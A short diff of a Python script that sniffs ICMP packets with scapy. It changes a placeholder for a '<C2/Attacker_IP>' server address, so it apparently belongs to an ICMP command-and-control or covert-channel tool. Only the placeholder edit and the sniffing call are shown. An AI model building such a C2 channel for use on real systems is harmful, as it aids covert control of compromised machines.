@@ -43,7 +43,7 @@ def process_packet(packet):
 
 def main():
     global target_ip
-    target_ip = "<C2/Attacker_IP>"  # Replace with your server's IP address
+    target_ip = "<C2/Attacker_IP/Hostname>"  # Replace with your server's IP address
     print("Listening for ICMP packets...")
     sniff(filter="icmp", prn=process_packet, store=0)
 
